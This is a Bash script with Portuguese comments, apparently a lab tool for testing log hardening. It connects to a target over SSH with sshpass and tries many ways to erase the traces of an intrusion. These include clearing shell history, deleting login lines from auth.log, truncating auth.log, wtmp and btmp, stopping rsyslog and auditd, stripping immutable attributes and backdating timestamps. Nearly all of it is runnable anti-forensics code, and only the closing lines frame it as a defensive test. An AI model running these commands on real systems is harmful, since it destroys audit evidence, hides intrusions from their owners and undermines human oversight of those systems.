#!/bin/bash

# Script de Ataque: Manipulação e Evasão de Logs SSH
# Simula invasor tentando apagar rastros após comprometer sistema

echo "=========================================="
echo "  ATAQUE: MANIPULAÇÃO E EVASÃO DE LOGS"
echo "=========================================="
echo ""

TARGET=$1
USER=${2:-vagrant}
PASS=${3:-vagrant}

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <IP_ALVO> [usuario] [senha]"
    exit 1
fi

echo "[*] Alvo: $TARGET"
echo "[*] Usuário: $USER"
echo "[*] Iniciando ataque de evasão de logs..."
echo ""

# Fase 1: Reconhecimento dos logs
echo "=========================================="
echo "FASE 1: RECONHECIMENTO DE LOGS"
echo "=========================================="
echo ""

echo "[1.1] Localizando arquivos de log do sistema..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "ls -lah /var/log/auth.log /var/log/syslog /var/log/lastlog 2>&1" 2>/dev/null

echo ""
echo "[1.2] Verificando permissões dos logs..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "stat /var/log/auth.log 2>&1 | grep -E 'Access|Uid'" 2>/dev/null

echo ""
echo "[1.3] Verificando últimas entradas SSH no log..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo tail -5 /var/log/auth.log 2>&1 | grep 'sshd'" 2>/dev/null

echo ""
sleep 2

# Fase 2: Tentativas de Evasão
echo "=========================================="
echo "FASE 2: TENTATIVAS DE EVASÃO"
echo "=========================================="
echo ""

echo "[2.1] Tentativa 1: Apagar histórico de comandos..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "history -c; echo '' > ~/.bash_history; echo 'Histórico limpo'" 2>/dev/null

echo ""
echo "[2.2] Tentativa 2: Remover entradas específicas do auth.log..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo sed -i '/Accepted password for $USER/d' /var/log/auth.log 2>&1 || echo 'FALHOU: Permissão negada ou imutável'" 2>/dev/null

echo ""
echo "[2.3] Tentativa 3: Truncar (esvaziar) arquivo de log..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo truncate -s 0 /var/log/auth.log 2>&1 || echo 'FALHOU: Arquivo protegido'" 2>/dev/null

echo ""
echo "[2.4] Tentativa 4: Desabilitar serviço de logging (rsyslog)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo systemctl stop rsyslog 2>&1 || echo 'FALHOU: Sem privilégios suficientes'" 2>/dev/null

echo ""
echo "[2.5] Tentativa 5: Remover atributo imutável do log..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo chattr -i /var/log/auth.log 2>&1 || echo 'FALHOU: chattr bloqueado ou sem permissão'" 2>/dev/null

echo ""
echo "[2.6] Tentativa 6: Modificar timestamp do arquivo..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo touch -t 202301010000 /var/log/auth.log 2>&1 || echo 'FALHOU: Touch bloqueado'" 2>/dev/null

echo ""
sleep 2

# Fase 3: Técnicas Avançadas
echo "=========================================="
echo "FASE 3: TÉCNICAS AVANÇADAS DE EVASÃO"
echo "=========================================="
echo ""

echo "[3.1] Tentativa: Limpar registros de login (wtmp/btmp)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo truncate -s 0 /var/log/wtmp /var/log/btmp 2>&1 || echo 'FALHOU: Arquivos protegidos'" 2>/dev/null

echo ""
echo "[3.2] Tentativa: Remover entradas do 'last' (lastlog)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo lastlog -u $USER -C 2>&1 || echo 'FALHOU: Comando não disponível ou bloqueado'" 2>/dev/null

echo ""
echo "[3.3] Tentativa: Desabilitar auditd (sistema de auditoria)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo systemctl stop auditd 2>&1 || echo 'Auditd não instalado ou protegido'" 2>/dev/null

echo ""
echo "[3.4] Tentativa: Verificar se logs estão em modo imutável..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo lsattr /var/log/auth.log 2>&1 | grep -E 'i|-'" 2>/dev/null

echo ""
sleep 2

# Fase 4: Verificação Final
echo "=========================================="
echo "FASE 4: VERIFICAÇÃO PÓS-ATAQUE"
echo "=========================================="
echo ""

echo "[4.1] Verificando integridade do auth.log..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo ls -lh /var/log/auth.log; echo 'Linhas restantes:'; sudo wc -l /var/log/auth.log" 2>/dev/null

echo ""
echo "[4.2] Verificando se rsyslog ainda está ativo..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo systemctl is-active rsyslog 2>&1" 2>/dev/null

echo ""
echo "[4.3] Verificando últimas 3 entradas do log (se ainda existir)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo tail -3 /var/log/auth.log 2>&1" 2>/dev/null

echo ""
echo "=========================================="
echo "  ATAQUE CONCLUÍDO"
echo "=========================================="
echo ""
echo "[*] Resumo: Este ataque testou 10+ técnicas de evasão de logs"
echo "[*] Sistemas protegidos devem bloquear TODAS essas tentativas"
echo "[*] Logs imutáveis + auditoria remota = proteção eficaz"
echo ""
